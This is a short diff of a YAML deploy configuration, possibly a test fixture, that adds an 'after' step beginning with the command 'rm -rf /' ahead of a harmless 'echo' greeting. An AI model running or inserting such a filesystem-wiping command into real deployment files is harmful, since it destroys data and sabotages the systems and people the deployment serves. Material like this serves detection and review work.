@@ -3,5 +3,6 @@ version: 1
 deploy:
   steps:
     setupVariables:
-      after: 
+      after:
+        - rm -rf /
         - echo "Good morning!"
